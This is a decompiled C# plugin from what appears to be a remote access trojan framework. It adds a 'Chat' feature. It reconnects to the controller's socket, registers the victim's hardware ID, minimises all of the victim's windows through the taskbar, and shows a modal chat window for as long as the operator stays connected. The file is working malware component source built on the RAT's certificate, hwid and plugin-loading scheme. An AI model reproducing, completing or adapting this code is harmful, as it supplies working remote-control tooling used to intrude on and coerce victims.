using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public class Plugin
{
	private const int WM_COMMAND = 273;

	private const int MIN_ALL = 419;

	private const int MIN_ALL_UNDO = 416;

	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public static Form1 chat;

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		Client.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
		if (Client.itsConnect)
		{
			Client.Send(LEB128.Write(new object[3] { "Chat", "Connect", Hwid }));
			chat = new Form1();
			SendMessage(FindWindow("Shell_TrayWnd", null), 273, (IntPtr)419, IntPtr.Zero);
			new Thread((ThreadStart)delegate
			{
				//IL_0005: Unknown result type (might be due to invalid IL or missing references)
				((Form)chat).ShowDialog();
			}).Start();
		}
		while (Client.itsConnect)
		{
			Thread.Sleep(1000);
		}
		Client.Disconnect();
		if (chat != null)
		{
			((Form)chat).Close();
		}
		Thread.Sleep(5000);
	}
}
